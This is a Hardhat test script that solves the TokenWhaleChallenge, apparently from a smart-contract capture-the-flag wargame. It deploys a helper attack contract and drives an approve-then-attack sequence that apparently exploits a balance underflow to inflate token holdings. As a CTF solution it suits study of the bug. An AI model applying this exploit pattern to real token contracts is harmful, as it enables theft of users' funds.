import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attackContract : Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);

    attackContract = await (
      await ethers.getContractFactory('AttackTokenWhaleChallenge', deployer)
    ).deploy(target.address);
    await attackContract.deployed();
    attackContract = await attackContract.connect(attacker);
  });

  it('exploit', async () => {
    console.log("Deployer balance: ", await target.balanceOf(deployer.address));
    console.log("Attacker balance: ", await target.balanceOf(attacker.address));
    console.log("Attack Contract balance: ", await target.balanceOf(attackContract.address));
    expect(await target.balanceOf(deployer.address)).to.equal(0);
    expect (await target.balanceOf(attacker.address)).to.equal(1000);
    expect (await target.balanceOf(attackContract.address)).to.equal(0);

    let approveTx = await target.approve(attackContract.address, 1000);
    await approveTx.wait();
    console.log("Allowance of Attack Contract: ", await target.allowance(attacker.address, attackContract.address));
    expect (await target.allowance(attacker.address, attackContract.address)).to.equal(1000);

    let attackTx = await attackContract.attack(attacker.address, deployer.address, 1000);
    await attackTx.wait();

    console.log("Attack Contract balance after attack: ", await target.balanceOf(attackContract.address));

    let transferTx = await attackContract.transfer(attacker.address, 999000);
    await transferTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
